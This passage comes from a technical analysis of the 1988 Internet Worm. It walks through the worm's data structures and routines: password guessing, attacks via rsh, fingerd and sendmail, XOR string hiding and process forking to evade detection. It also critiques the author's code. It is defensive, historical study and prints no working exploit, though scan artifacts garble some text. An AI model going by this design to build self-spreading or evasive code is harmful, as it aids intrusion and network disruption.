effort had  been made to break local passwords.  One out of every seven worms  would become immortal rather than check for other local  worms.  This was probably done to defeat any attempt to put a fake worm  process on the TCP  port to kill existing worms. It also  contributed to the load of a machine once infected.  The worm  attempted to send an UDP packet to the host ernie.berkeley.edu   10   approximately once every 15 infections, based on a random number  comparison. The code to do this  was incorrect, however, and no  information was ever sent. Whether this was the intended ruse  or  whether there was actually some reason for the byte to be sent is  not currently known. However, the code is such that an  uninitialized byte is the intended message. It is possible that  the  author eventually intended to run some monitoring program on  ernie   after breaking into an account, no doubt  . Such a  program could obtain the sending host number from the single byte  message, whether it was sent as a TCP or UDP packet. However, no  evidence for such a program has been found and it is possible  that the connection was simply a feint to cast suspicion  on  personnel at Berkeley.  The worm would also fork itself on a  regular basis and kill its parent. This served two  purposes.  First, the worm appeared to keep changing its process id and no  single process accumulated excessive amounts of cpu time.  Secondly, processes that have been running for a long  time have  their priority downgraded by the scheduler. By forking, the new  process would  regain normal scheduling priority. This mechanism  did not always work correctly, either, as we  locally observed  some instances of the worm with over 600 seconds of accumulated  cpu time.  If the worm ran for more than 12 hours, it would flush  its host list of all entries flagged as  being immune or already  infected. The way hosts were added to this list implies that a  single  worm might reinfect the same machines every 12 hours.    5. A Tour of the Worm    The following is a brief, high level description of the routines  present in the worm code.  The description covers all the  significant functionality of the program, but does not describe  all  the auxiliary routines used nor does it describe all the  parameters or algorithms involved. It  should, however, give the  user a complete view of how the worm functioned.    5.1. Data Structures    The worm had a few global data structures worth mentioning.  Additionally, the way it  handled some local data is of interest.    5.1.1. Host list    The worm constructed a linked list of host records. Each record  contained an array of 12  character pointers to allow storage of  up to 12 host names aliases. Each record also contained  an array  of six long unsigned integers for host addresses, and each record  contained a flag field.  The only flag bits used in the code  appear to be 0x01   host was a gateway  , 0x2   host has been   infected  , 0x4   host cannot be infected  320 not reachable, not  UNIX, wrong machine type  , and  0x8   host was ``equivalent'' in  the sense that it appeared in a context like .rhosts file  .    5.1.2. Gateway List    The worm constructed a simply array of gateway IP addresses  through the use of the system netstat command. These addresses  were used to infect directly connected networks. The  use of the  list is described in the explanation of scan_gateways and  rt_init, below.    5.1.3. Interfaces list    An array of records was filled in with information about each  network interface active on  the current host. This included the  name of the interface, the outgoing address, the netmask, the   destination host if the link was point to point   11   , and the interface flags.     5.1.4. Pwd    A linked list of records was built to hold user information. Each  structure held the  account name, the encrypted password, the  home directory, the gecos field, and a link to the  next record.  A blank field was also allocated for decrypted passwords as they  were found.    5.1.5. objects    The program maintained an array of ``objects'' that held the  files that composed the worm.  Rather than have the files stored  on disk, the program read the files into these internal  structures.  Each record in the list contained the suffix of the  file name   e.g., ``sun3.o''  , the size of the file,  and the  encrypted contents of the file. The use of this structure is  described below.    5.1.6. Words    A mini dictionary of words was present in the worm to use in  password guessing   see  Appendix A  . The words were stored in  an array, and every word was masked   XOR   with the  bit pattern  0x80. Thus, the dictionary would not show up with an invocation  of the strings program on the binary or object files.    5.1.7. Embedded Strings    Every text string used by the program, without exception, was  masked   XOR   with the bit  pattern 0x81. Every time a string  was referenced, it was referenced via a call to XS. The XS  function decrypted the requested string in a static circular  buffer and returned a pointer to the  decrypted version. This  also kept any of the text strings in the program from appearing  during  an invocation of strings. Simply clearing the high order  bit   e.g., XOR 0x80   or displaying the  program binary would  not produce intelligible text. All references to XS have been  omitted  from the following text  realize that every string was  so encrypted.  It is not evident how the strings were placed in  the program in this manner. The masked strings were present  inline in the code, so some preprocessor or a modified version of  the compiler must have been used. This represents a significant  effort by the author of the worm, and suggests quite strongly  that the author wanted to complicate or prevent the analysis of  the program once it was discovered.   5.2. Routines   The descriptions given here are arranged in alphabetic order. The  names of some routines are exactly as used by the author of the  code. Other names are based on the function of the routine, and  those names were chosen because the original routines were  declared static and name information was not present in the  object files. If the reader wishes to trace the functional  257ow  of the worm, begin with the descriptions of routines main and  doit   presented first for this reason  . By function, the  routines can be   arbitrarily   grouped as follows  setup and  utility   main, doit, crypt, h_addaddr, h_addname, h_addr2host,  h_clean, h_name2host, if_init, loadobject, makemagic, netmaskfor,  permute, rt_init, supports_rsh, and supports_telnet. network    password attacks   attack_network, attack_user, crack_0, crack_1,  crack_2, crack_3, cracksome, ha, hg, hi, hl, hul, infect,  scan_gateways, sendworm, try_fingerd, try_password, try_rsh,  try_sendmail, and waithit. camouflage  checkother, other_sleep,  send_message, and xorbuf.   5.2.1. main   This was where the program started. The first thing it did was  change its argument vector to make it look like it was the shell  running. Next, it set its resource limits so a failure would not  drop a core file. Then it loaded all the files named on the  command line into the object structure in memory using calls to  loadobject. If the file was not one of the objects loaded, the  worm would immediately call exit. Next, the code unlinked all the  object files, the file named sh   the worm itself  , and the file   tmp .dumb   apparently a remnant of some earlier version of the  program, possibly used as a restraint or log during  testing 320the file is not otherwise referenced  . The program  then finished zeroing out the argument vector. Next, the code  would call if_init. If no interfaces were discovered by that  routine, the program would call exit. The program would then get  its current process group. If the process group was the same as  its parent process id   passed on the command line  , it would  reset its process group and send a KILL signal to its parent.  Last of all, the routine doit was invoked.   5.2.2. doit   This was the main worm code. First, a variable was set to the  current time with a call to time, and the random number generator  was initialized with the return value. Next, the routines hg and  hl were invoked to infect some hosts. If one or both of these  failed to infect any hosts, the routine ha was invoked. Next, the  routine checkother was called to see if other worms were on this  host. The routine send_message was also called to cast suspicion  on the folks at Berkeley.   12  The code then entered an infinite loop  A call would be made to  cracksome followed by a call to other_sleep with a parameter of  30. Then cracksome would be called again. At this point, the  process would fork itself, and the parent would exit, leaving the  child to continue. Next, the routines hg, ha, and hi would all be  called to infect other hosts. If any one   or combination   of  these routines failed to infect a new host, the routine hl would  be called to infect a local host. Thus, the code was aggressive  about always infecting at least one host each pass through this  loop. The logic here was faulty, however, because if all known  gateway hosts were infected, or a bad set of host numbers were  tried in ha, this code would call hl every time through the loop.  Such behavior was one of the reasons hosts became overloaded with  worm processes  every pass through the loop, each worm would  likely be forced to infect another local host. Considering that  multiple worms could run on a host for some time before one would  exit, this could lead to an exponential growth of worms in a LAN  environment. Next, the routine other_sleep was called with a  timeout of 120. A check was then made to see if the worm had run  for more than 12 hours. If so, a call was made to h_clean.  Finally, a check was made of the pleasequit and nextw variables    set in other_sleep or checkother, and crack_2, respectively  .   If pleasequit was nonzero, and nextw was greater than 10, the  worm would exit.   5.2.3. attack_network   This routine was designed to infect random hosts on a subnet.  First, for each of the network interfaces, if checked to see if  the target host was on a network to which the current host was  directly connected. If so, the routine immediately returned.  13  Based on the class of the netmask   e.g., Class A, Class B  , the  code constructed a list of likely network numbers. A special  algorithm was used to make good guesses at potential Class A host  numbers. All these constructed host numbers were placed in a  list, and the list was then randomized using permute. If the  network was Class B, the permutation was done to favor low  numbered hosts by doing two separate permutations 320the first  six hosts in the output list were guaranteed to be chosen from  the first dozen   low numbered   host numbers generated. The  first 20 entries in the permuted list were the only ones  examined. For each such IP address, its entry was retrieved from  the global list of hosts   if it was in the list  . If the host  was in the list and was marked as already infected or immune, it  was ignored. Otherwise, a check was made to see if the host  supported the rsh command   identifying it as existing and having  BSD derived networking services   by calling supports_rsh. If the  host did support rsh, it was entered into the hosts list if not  already present, and a call to infect was made for that host. If  a successful infection occurred, the routine returned early with  a value of TRUE   1  .   5.2.4. attack_user   This routine was called after a user password was broken. It has  some incorrect code and may not work properly on every  architecture because a subroutine call was missing an argument.  However, on Suns and VAXen, the code will work because the  missing argument was supplied as an extra argument to the  previous call, and the order of the arguments on the stack  matches between the two routines. It was largely a coincidence  that this worked. The routine attempted to open a .forward file  in the the user's home directory, and then for each host and user  name present in that file, it called the hul routine. It then did  the same thing with the .rhosts file, if present, in the user's  home directory.   5.2.5. checkother   This routine was to see if another worm was present on this  machine and is a companion routine to other_sleep. First, a  random value was checked  with a probability of 1 in 7, the  routine returned without ever doing anything 320these worms  become immortal in the sense that they never again participated  in the process of thinning out multiple local worms. Otherwise,  the worm created a socket and tried to connect to the local  ``worm port'' 320 23357. If the connection was successful, an  exchange of challenges was made to verify that the other side was  actually a fellow worm. If so, a random value was written to the  other side, and a value was read from the socket. If the sum of  the value sent plus the value read was even, the local worm set  its pleasequit variable to 1, thus marking it for eventual self  destruction. The socket was then closed, and the worm opened a  new socket on the same port   if it was not destined to self  destruct   and set other_fd to that socket to listen for other  worms. If any errors were encountered during this procedure, the  worm involved set other_fd to  1 and it returned from the  routine. This meant that any error caused the worm to be  immortal, too.   5.2.6. crack_0   This routine first scanned the  etc hosts.equiv file, adding new  hosts to the global list of hosts and setting the  257ags field  to mark them as equivalent.  Calls were made to name2host and  getaddrs. Next, a similar scan was made of the  .rhosts file  using the exact same calls. The code then called setpwent to open  the  etc passwd file. A loop was performed as long as passwords  could be read  Every 10th entry, a call was made to other_sleep  with a timeout of 0. For each user, an attempt was made to open  the file .forward  14  in the home directory of that user, and read the hostnames  therein. These hostnames were also added to the host list and  marked as equivalent. The encrypted password, home directory, and  gecos field for each user was stored into the pwd structure.  After all user entries were read, the endpwent routine was  invoked, and the cmode variable was set to 1.   5.2.7. crack_1   This routine tried to break passwords. It looped until all  accounts had been tried, or until the next group of 50 accounts  had been tested. In the loop  A call was made to other_sleep with  a parameter of zero each time the loop index modulo 10 was zero    i.e., every 10 calls  . Repeated calls were made to  try_password with the values discussed earlier in  2474 8b. Once  all accounts had been tried, the variable cmode was set to 2.   5.2.8. crack_2   This routine used the mini dictionary in an attempt to break user  passwords   see Appendix A  . The dictionary was first permuted    using the permute   call. Each word was decrypted in  place by  XORing its bytes with 0x80. The decrypted word was then passed to  the try_password routine for each user account. The word was then  re encrypted. A global index, named nextw was incremented to  point to the next dictionary entry. The nextw index is also used  in doit to determine if enough effort had been expended so that  the worm could ``...go gently into that good night.'' When no  more words were left, the variable cmode was set to 3. There are  two interesting points to note in this routine  the reverse of  these words were not tried, although that would seem like a  logical thing to do, and all words were encrypted and decrypted  in place rather than in a temporary buffer. This is less  efficient than a copy while masking since no re encryption ever  needs to be done. As discussed in the next section, many examples  of unnecessary effort such as this were present in the program.  Furthermore, the entire mini dictionary was decrypted all at once  rather than a word at a time. This would seem to lessen the  benefit of encrypting those words at all, since the entire  dictionary would then be present in memory as plaintext during  the time all the words were tried.   5.2.9. crack_3   This was the last password cracking routine. It opened   usr dict words, and for each word found it called try_password  against each account. If the first letter of the word was a  capital, it was converted to lower case and retried. After all  words were tried, the variable cmode was incremented and the  routine returned. In this routine, no calls to other_sleep were  interspersed, thus leading to processes that ran for a long time  before checking for other worms on the local machine. Also of  note, this routine did not try the reverse of words either!   5.2.10. cracksome   This routine was a simple switch statement on an external  variable named cmode and it implemented the five strategies  discussed in  2474 8 of this paper. State zero called crack_0,  state one called crack_1,  state two called crack_2,  and state  three called crack_3.  The default case simply returned.   5.2.11. crypt   This routine took a key and a salt, then performed the UNIX  password encryption function on a block of zero bits. The return  value of the routine was a pointer to a character string of 13  characters representing the encoded password. The routine was  highly optimized and differs considerably from the standard  library version of the same routine. It called the following  routines  compkeys, mungE, des, and ipi. A routine, setupE,  was  also present and was associated with this code, but it was never  referenced. It appears to duplicate the functionality of the  mungE function.   5.2.12. h_addaddr   This routine added alternate addresses to a host entry in the  global list if they were not already present.   5.2.13. h_addname   This routine added host aliases   names   to a given host entry.  Duplicate entries were suppressed.   5.2.14. h_addr2host   The host address provided to the routine was checked against each  entry in the global host list to see if it was already present.  If so, a pointer to that host entry was returned. If not, and if  a parameter flag was set, a new entry was initialized with the  argument address and a pointer to it was returned.   5.2.15. h_clean   This routine traversed the host list and removed any entries  marked as infected or immune   leaving hosts not yet tried  .   5.2.16. h_name2host   Just like h_addr2host except the comparison was done by name with  all aliases.   5.2.17. ha   This routine tried to infect hosts on remote networks. First, it  checked to see if the gateways list had entries  if not, it  called rt_init.  Next, it constructed a list of all IP addresses  for gateway hosts that responded to the try_telnet routine. The  list of host addresses was randomized by permute.  Then, for each  address in the list so constructed, the address was masked with  the value returned by netmaskfor and the result was passed to the  attack_network routine. If an attack was successful, the routine  exited early with a return value of TRUE.   5.2.18. hg   This routine attempted to infect gateway machines. It first  called rt_init to reinitialize the list of gateways, and then for  each gateway it called the main infection routine, infect,  with  the gateway as an argument. As soon as one gateway was  successfully infected, the routine returned TRUE.   5.2.19. hi   This routine tried to infect hosts whose entries in the hosts  list were marked as equivalent.  The routine traversed the global  host list looking for such entries and then calling infect with  those hosts. A successful infection returned early with the value  TRUE.   5.2.20. hl   This routine was intended to attack hosts on directly connected  networks. For each alternate address of the current host, the  routine attack_network was called with an argument consisting of  the address logically and ed with the value of netmask for that  address. A success caused the routine to return early with a  return value of TRUE.   5.2.21. hul   This function attempted to attack a remote host via a particular  user. It first checked to make sure that the host was not the  current host and that it had not already been marked as infected.  Next, it called getaddrs to be sure there was an address to be  used. It examined the username for punctuation characters, and  returned if any were found. It then called other_sleep with an  argument of 1. Next, the code tried the attacks described in   2474 10. Calls were made to sendworm if either attack succeeded  in establishing a shell on the remote machine.   5.2.22. if_init   This routine constructed the list of interfaces using ioctl  calls. In summary, it obtained information about each interface  that was up and running, including the destination address in  point to point links, and any netmask for that interface. It  initialized the me pointer to the first non loopback address  found, and it entered all alternate addresses in the address  list.   5.2.23. infect   This was the main infection routine. First, the host argument was  checked to make sure that it was not the current host, that it  was not currently infected, and that it had not been determined  to be immune. Next, a check was made to be sure that an address  for the host could be found by calling getaddrs.  If no address  was found, the host was marked as immune and the routine returned  FALSE. Next, the routine called other_sleep with a timeout of 1.  Following that, it tried, in succession, calls to try_rsh,   try_fingerd,  and try_sendmail.  If the calls to try_rsh or  try_fingerd   succeeded, the file descriptors established by those invocations  were passed as arguments to the sendworm call. If any of the  three infection attempts succeeded, infect returned early with a  value of TRUE. Otherwise, the routine returned FALSE.   5.2.24. loadobject   This routine read an object file into the objects structure in  memory. The file was opened and the size found with a call to the  library routine fstat.  A buffer was malloc'd of the appropriate  size, and a call to read was made to read the contents of the  file. The buffer was encrypted with a call to xorbuf,  then  transferred into the objects array. The suffix of the name    e.g., sun3.o, l1.c, vax.o   was saved in a field in the  structure, as was the size of the object.   5.2.25. makemagic   The routine used the library random call to generate a random  number for use as a challenge number. Next, it tried to connect  to the telnet port    23   of the target host, using each  alternate address currently known for that host. If a successful  connection was made, the library call getsockname was called to  get the canonical IP address of the current host relative to the  target. Next, up to 1024 attempts were made to establish a TCP  socket, using port numbers generated by taking the output of the  random number generator modulo 32767. If the connection was  successful, the routine returned the port number, the file  descriptor of the socket, the canonical IP address of the current  host, and the challenge number.   5.2.26. netmaskfor   This routine stepped through the interfaces array and checked the  given address against those interfaces. If it found that the  address was reachable through a connected interface, the netmask  returned was the netmask associated with that interface.  Otherwise, the return was the default netmask based on network  type   Class A, Class B, Class C  .   5.2.27. other_sleep   This routine checked a global variable named other_fd.  If the  variable was less than zero, the routine simply called sleep with  the provided timeout argument, then returned. Otherwise, the  routine waited on a select system call for up to the value of the  timeout. If the timeout expired, the routine returned. Otherwise,  if the select return code indicated there was input pending on  the other_fd descriptor, it meant there was another worm on the  current machine. A connection was established and an exchange of  ``magic'' numbers was made to verify identity. The local worm  then wrote a random number   produced by random   to the other  worm via the socket. The reply was read and a check was made to  ensure that the response came from the localhost   127.0.0.1  .  The file descriptor was closed. If the random value sent plus the  response was an odd number, the other_fd variable was set to  1  and the pleasequit variable was set to 1. This meant that the  local worm would die when conditions were right   cf. doit   ,  and that it would no longer attempt to contact other worms on the  local machine. If the sum was even, the other worm was destined  to die.   5.2.28. permute   This routine randomized the order of a list of objects. This was  done by executing a loop once for each item in the list. In each  iteration of the loop, the random number generator was called  modulo the number of items in the list. The item in the list  indexed by that value was swapped with the item in the list  indexed by the current loop value   via a call to bcopy  .   5.2.29. rt_init   This initialized the list of gateways. It started by setting an  external counter, ngateways,  to zero. Next, it invoked the  command `` usr ucb netstat  r  n'' using a popen call. The code  then looped while output was received from the netstat command  A  line was read. A call to other_sleep was made with a timeout of  zero. The input line was parsed into a destination and a gateway.  If the gateway was not a valid IP address, or if it was the  loopback address   127.0.0.1  , it was discarded. The value was  then compared against all the gateway addresses already known   duplicates were skipped. It was also compared against the list of  local interfaces   local networks  , and discarded if a  duplicate. Otherwise, it was added to the list of gateways and  the counter incremented.   5.2.30. scan_gateways   First, the code called permute to randomize the gateways list.  Next, it looped over each gateway or the first 20, whichever was  less  A call was made to other_sleep with a timeout of zero. The  gateway IP address was searched for in the host list  a new entry  was allocated for the host if none currently existed. The gateway  flag was set in the flags field of the host entry. A call was  made to the library routine gethostbyaddr with the IP number of  the gateway. The name, aliases and address fields were added to  the host list, if not already present. Then a call was made to  gethostbyname and alternate addresses were added to the host  list. After this loop was executed, a second loop was started  that did effectively the same thing as the first! There is no  clear reason why this was done, unless it is a remnant of earlier  code, or a stub for future additions.   5.2.31. send_message   This routine made a call to random and 14 out of 15 times  returned without doing anything. In the 15th case, it opened a  stream socket to host ``ernie.berkeley.edu'' and then tried to  send an uninitialized byte using the sendto call. This would not  work   using a UDP send on a TCP socket  .   5.2.32. sendworm   This routine sent the worm code over a connected TCP circuit to a  remote machine. First it checked to make sure that the objects  table held a copy of the l1.c code   see Appendix B  . Next, it  called makemagic to get a local socket established and to  generate a challenge string. Then, it encoded and wrote the  script detailed previously in  2474 2a. Finally, it called  waithit and returned the result code of that routine. The object  files shipped across the link were decrypted in memory first by a  call to xorbuf and then re encrypted afterwards.   5.2.33. supports_rsh   This routine determined if the target host, specified as an  argument, supported the BSD  derived rsh protocol. It did this by  creating a socket and attempting a TCP connection to port 514 on  the remote machine. A timeout or connect failure caused a return  of FALSE  otherwise, the socket was closed and the return value  was TRUE.   5.2.34. supports_telnet   This routine determined if a host was reachable and supported the  telnet protocol   i.e., was probably not a router or similar  ``dumb'' box  . It was similar to supports_rsh in nature. The  code established a socket, connected to the remote machine on  port 23, and returned FALSE if an error or timeout occurred   otherwise, the socket was closed and TRUE was returned.   5.2.35. try_fingerd   This routine tried to establish a connection to a remote finger  daemon on the given host by connecting to port 79. If the  connection succeeded, it sent across an overfull buffer as  described in  2474 8b and waited to see if the other side became  a shell. If so, it returned the file descriptors to the caller   otherwise, it closed the socket and returned a failure code.   5.2.36. try_password   This routine called crypt with the password attempt and compared  the result against the encrypted password in the pwd entry for  the current user. If a match was found, the unencrypted password  was copied into the pwd structure, and the routine attack_user  was invoked.   5.2.37. try_rsh   This function created two pipes and then forked a child process.  The child process attempted to rexec a remote shell on the host  specified in the parameters, using the specified username and  password. Then the child process tried to invoke the rsh command  by attempting to run, in order, `` usr ucb rsh,''  `` usr bin rsh,'' and `` bin rsh.'' If the remote shell  succeeded, the function returned the file descriptors of the open  pipe. Otherwise, it closed all file descriptors, killed the child  with a SIGKILL, and reaped it with a call to wait3.   5.2.38. try_sendmail   This routine attempted to establish a connection to the SMTP port     25   on the remote host. If successful, it conducted the  dialog explained in  2474 2b. It then called the waithit routine  to see if the infection ``took.'' Return codes were checked after  each line was transmitted, and if a return code indicated a  problem, the routine aborted after sending a ``quit'' message.   5.2.39. waithit   This function acted as the bootstrap server for a vector program  on a remote machine. It waited for up to 120 seconds on the  socket created by the makemagic routine, and if no connection was  made it closed the socket and returned a failure code. Likewise,  if the first thing received was not the challenge string shipped  with the bootstrap program, the socket was closed and the routine  returned. The routine decrypted each object file using xorbuf and  sent it across the connection to the vector program   see  Appendix B  . Then a script was transmitted to compile and run  the vector. This was described in  2474 4. If the remote host was  successfully infected, the infected flag was set in the host  entry and the socket closed. Otherwise, the routine sent rm  command strings to delete each object file. The function returned  the success or failure of the infection.   5.2.40. xorbuf   This routine was somewhat peculiar. It performed a simple  encryption decryption function by XORing the buffer passed as an  argument with the first 10 bytes of the xorbuf routine itself!  This code would not work on a machine with a split I D space or  on tagged architectures.   6. Analysis of the Code   6.1. Structure and Style   An examination of the reverse engineered code of the worm is  instructive. Although it is not the same as reading the original  code, it does reveal some characteristics of the author  s  . One  conclusion that may surprise some people is that the quality of  the code is mediocre, and might even be considered poor. For  instance, there are places where calls are made to functions with  either too many or too few arguments. Many routines have local  variables that are either never used, or are potentially used  before they are initialized. In at least one location, a struct  is passed as an argument rather than the address of the struct.  There is also dead code, as routines that are never referenced,  and as code that cannot be executed because of conditions that  are never met   possibly bugs  . It appears that the author  s    never used the lint utility on the program. At many places in the  code, there are calls on system routines and the return codes are  never checked for success. In many places, calls are made to the  system heap routine, malloc and the result is immediately used  without any check. Although the program was configured not to  leave a core file or other evidence if a fatal failure occurred,  the lack of simple checks on the return codes is indicative of  sloppiness  it also suggests that the code was written and run  with minimal or no testing. It is certainly possible that some  checks were written into the code and elided subject to  conditional compilation flags. However, there would be little  reason to remove those checks from the production version of the  code. The structures chosen for some of the internal data are  also revealing. Everything was represented as linked lists of  structures. All searches were done as linear passes through the  appropriate list. Some of these lists could get quite long and  doubtless that considerable CPU time was spent by the worm just  maintaining and searching these lists. A little extra code to  implement hash buckets or some form of sorted lists would have  added little overhead to the program, yet made it much more  efficient   and thus quicker to infect other hosts and less  obvious to system watchers  . Linear lists may be easy to code,  but any experienced programmer or advanced CS student should be  able to implement a hash table or lists of hash buckets with  little difficulty. Some effort was duplicated in spots. An  example of this was in the code that tried to break passwords.  Even if the password to an account had been found in an earlier  stage of execution, the worm would encrypt every word in the  dictionary and attempt a match against it. Similar redundancy can  be found in the code to construct the lists of hosts to infect.  There are locations in the code where it appears that the  author  s   meant to execute a particular function but used the  wrong invocation. The use of the UDP send on a TCP socket is one  glaring example. Another example is at the beginning of the  program where the code sends a KILL signal to its parent process.  The surrounding code gives strong indication that the user  actually meant to do a killpg instead but used the wrong call.  The one section of code that appears particularly well thought  out involves the crypt routines used to check passwords. As has  been noted in  Seel88 , this code is nine times faster than the  standard Berkeley crypt function. Many interesting modifications  were made to the algorithm, and the routines do not appear to  have been written by the same author as the rest of the code.  Additionally, the routines involved have some support for both  encryption anddecryption 320even though only encryption was  needed for the worm. This supports the assumption that this  routine was written by someone other than the author  s   of the  program, and included with this code. It would be interesting to  discover where this code originated and how it came to be in the  Worm program. The program could have been much more virulent had  the author  s   been more experienced or less rushed in her his  coding. However, it seems likely that this code had been  developed over a long period of time, so the only conclusion that  can be drawn is that the author  s   was sloppy or careless   or  both  , and perhaps that the release of the worm was premature.   6.2. Problems of Functionality   There is little argument that the program was functional. In  fact, we all wish it had been less capable! However, we are lucky  in the sense that the program had flaws that prevented it from  operating to the fullest. For instance, because of an error, the  code would fail to infect hosts on a local area network even  though it might identify such hosts. Another example of  restricted functionality concerns the gathering of hostnames to  infect. As noted already, the code failed to gather host names   From user .rhosts files early on. It also did not attempt to  collect host names from other user and system files containing  such names   e.g.,  etc hosts.lpd  . Many of the operations could  have been done ``smarter.'' The case of using linear structures  has already been mentioned. Another example would have been to  sort user passwords by the salt used. If the same salt was  present in more than one password, then all those passwords could  be checked in parallel as a single pass was made through the  dictionaries. On our machine, 5  of the 200 passwords share the  same salts, for instance. No special advantage was taken if the  root password was compromised. Once the root password has been  broken, it is possible to fork children that set their uid and  environment variables to match each designated user. These  processes could then attempt the rsh attack described earlier in  this report. Instead, root is treated as any other account. It  has been suggested to me that this treatment of root may have  been a conscious choice of the worm author  s  . Without knowing  the true motivation of the author, this is impossible to decide.  However, considering the design and intent of the program, I find  it difficult to believe that such exploitation would have been  omitted if the author had thought of it. The same attack used on  the finger daemon could have been extended to the Sun version of  the program, but was not. The only explanations that come to mind  why this was not done are that the author lacked the motivation,  the ability, the time, or the resources to develop a version for  the Sun. However, at a recent meeting, Professor Rick Rashid of  Carnegie Mellon University was heard to claim that Robert T.  Morris, the alleged author of the worm, had revealed the fingerd  bug to system administrative staff at CMU well over a year ago.  15  Assuming this report is correct and the worm author is indeed Mr.  Morris, it is obvious that there was sufficient time to construct  a Sun version of the code. In fact, I asked three Purdue graduate  students   Shawn D. Ostermann, Steve J. Chapin, and Jim N.  Griffoen to develop a Sun 3 version of the attack, and they did  so in under three hours. The Worm author certainly must have had  access to Suns or else he would not have been able to provide Sun  binaries to accompany the operational worm. Motivation should  also not be a factor considering everything else present in the  program. With time and resources available, the only reason I  cannot immediately rule out is that he lacked the knowledge of  how to implement a Sun version of the attack. This seemsunlikely,  but given the inconsistent nature of the rest of the code, it is  certainly a possibility. However, if this is the case, it raises  a new question  was the author of the Worm the original author of  the VAX fingerd attack  Perhaps the most obvious shortcoming of  the code is the lack of understanding about propagation and load.  The reason the worm was spotted so quickly and caused so much  disruption was because it replicated itself exponentially on some  networks, and because each worm carried no history with it.  Admittedly, there was a check in place to see if the current  machine was already infected, but one out of every seven worms  would never die even if there was an existing infestation.  Furthermore, worms marked for self destruction would continue to  execute up to the point of having made at least one complete pass  through the password file. Many approaches could have been taken  by the author  s   to slow the growth of the worm or prevent  reinfestation  little is to be gained from explaining them here,  but their absence from the worm program is telling. Either the  author  s   did not have any understanding of how the program  would propagate, or else she he they did not care  the existence  in the Worm of mechanisms to limit growth tends to indicate that  it was a lack of understanding rather than indifference. Some of  the algorithms used by the Worm were reasonably clever. One in  particular is interesting to note  when trying passwords from the  built in list, or when trying to break into connected hosts, the  worm would randomize the list of candidates for trial. Thus, if  more than one worm were present on the local machine, they would  be more likely to try candidates in a different order, thus  maximizing their coverage. This implies, however   as does the  action of the pleasequit variable   that the author  s   was not  overly concerned with the presence of multiple worms on the same  machine. More to the point, multiple worms were allowed for a  while in an effort to maximize the spread of the infection. This  also supports the contention that the author did not understand  the propagation or load effects of the Worm. The design of the  vector program, the ``thinning'' protocol, and the use of the  internal state machine were all clever and non obvious. The  overall structure of the program, especially the code associated  with IP addresses, indicates considerable knowledge of networking  and the routines available to support it. The knowledge evidenced  by that code would indicate extensive experience with networking  facilities. This, coupled with some of the errors in the Worm  code related to networking, further support the thesis that the  author was not a careful programmer 320the errors in those parts  of the code were probably not errors because of ignorance or  inexperience.   6.3. Camouflage   Great care was taken to prevent the worm program from being  stopped. This can be seen by the caution with which new files  were introduced into a machine, including the use of random  challenges. It can be seen by the fact that every string compiled  into the worm was encrypted to prevent simple examination. It was  evidenced by the care with which files associated with the worm  were deleted from disk at the earliest opportunity, and the  corresponding contents were encrypted in memory when loaded. It  was evidenced by the continual forking of the process, and the    faulty   check for other instances of the worm on the local  host. The code also evidences precautions against providing  copies of itself to anyone seeking to stop the worm. It sets its  resource limits so it cannot dump a core file, and it keeps  internal data encrypted until used. Luckily, there are other  methods of obtaining core files and data images, and researchers  were able to obtain all the information they needed to  disassemble and reverse engineer the code. There is no doubt,  however, that the author  s   of the worm intended to make such a  task as difficult as possible.   6.4. Specific Comments   Some more specific comments are worth making. These are directed  to particular aspects of the code rather than the program as a  whole.   6.4.1. The sendmail attack   Many sites tend to experience substantial loads because of heavy  mail traffic. This is especially true at sites with mailing list  exploders. Thus, the administrators at those sites have  configured their mailers to queue incoming mail and process the  queue periodically. The usual configuration is to set sendmail to  run the queue every 30 to 90 minutes. The attack through sendmail  would fail on these machines unless the vector program were  delivered into a nearly empty queue within 120 seconds of it  being processed. The reason for this is that the infecting worm  would only wait on the server socket for two minutes after  delivering the ``infecting mail.'' Thus, on systems with delayed  queues, the vector process would not get built in time to  transfer the main worm program over to the target. The vector  process would fail in its connection attempt and exit with a  non zero status. Additionally, the attack through sendmail  invoked the vector program without a specific path. That is, the  program was invoked with ``foo'' instead of ``. foo'' as was done  with the shell based attack. As a result, on systems where the  default path used by sendmail's shell did not contain the current  directory   ``.''  , the invocation of the code would fail. It  should be noted that such a failure interrupts the processing of  subsequent commands   such as the rm of the files  , and this may  be why many system administrators discovered copies of the vector  program source code in their  usr tmp directories.   6.4.2. The machines involved   As has already been noted, this attack was made only on Sun 3  machines and VAX machines running BSD UNIX.  It has been observed  in at least one mailing list that had the Sun code been compiled  with the  mc68010 flag, more Sun machines would have fallen  victim to the worm. It is a matter of some curiosity why more  machines were not targeted for this attack. In particular, there  are many Pyramid, Sequent, Gould, Sun 4, and Sun i386 machines on  the net.  16  If binary files for those had also been included, the worm could  have spread much further. As it was, some locations such as Ohio  State were completely spared the effects of the worm because all  their ``known'' machines were of a type that the worm could not  infect. Since the author of the program knew how to break into  arbitrary UNIX machines, it seems odd that he she did not attempt  to compile the program on foreign architectures to include with  the worm.   6.4.3. Portability considerations   The author  s   of the worm may not have had much experience with  writing portable UNIX code, including shell scripts. Consider  that in the shell script used to compile the vector, the  following command is used  if    f sh   The use of the    character as a synonym for the test function is not universal.  UNIX users with experience writing portable shell files tend to  spell out the operator test rather than rely on therebeing a link  to a file named `` '' on any particular system. They also know  that the test operator is built in to many shells and thus faster  than the external   variant. The test invocation used in the worm  code also uses the  f flag to test for presence of the file named  sh.  This provided us with the worm ``condom'' published Thursday  night   17  creating a directory with the name sh in  usr tmp causes this  test to fail, as do later attempts to create executable files by  that name. Experienced shell programmers tend to use the  e    exists   flag in circumstances such as this, to detect not only  directories, but sockets, devices, named FIFOs, etc. Other  colloquialisms are present in the code that bespeak a lack of  experience writing portable code. One such example is the code  loop where file units are closed just after the vector program  starts executing, and again in the main program just after it  starts executing. In both programs, code such as the following is  executed  for   i   0  i   32  i     close  i    The portable way  to accomplish the task of closing all file descriptors   on  Berkeley derived systems   is to execute  for   i   0  i    getdtablesize      i     close   i    or the even more efficient  for   i   getdtablesize     1  i    0  i     close  i    This is  because the number of file units available   and thus open   may  vary from system to system.   6.5. Summary   Many other examples can be drawn from the code, but the points  should be obvious by now  the author of the worm program may have  been a moderately experienced UNIX programmer, but s he was by no  means the ``UNIX Wizard'' many have been claiming. The code  employs a few clever techniques and tricks, but there is some  doubt if they are all the original work of the Worm author. The  code seems to be the product of an inexperienced or sloppy  programmer. The person   or persons   who put this program  together appears to lack fundamental insight into some  algorithms, data structures, and network propagation, but at the  same time has some very sophisticated knowledge of network  features and facilities. The code does not appear to have been  tested   although anything other than unit testing would not be  simple to do  , or else it was prematurely released. Actually, it  is possible that both of 